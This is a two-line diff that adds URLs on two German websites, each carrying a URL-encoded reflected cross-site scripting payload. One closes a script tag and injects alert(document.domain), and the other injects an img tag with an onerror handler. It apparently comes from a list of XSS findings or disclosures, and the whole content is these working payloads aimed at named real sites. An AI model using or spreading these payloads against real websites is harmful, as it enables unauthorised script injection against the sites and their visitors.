@@ -1,0 +1,2 @@
+http://falken4you.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://faltcaravans.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
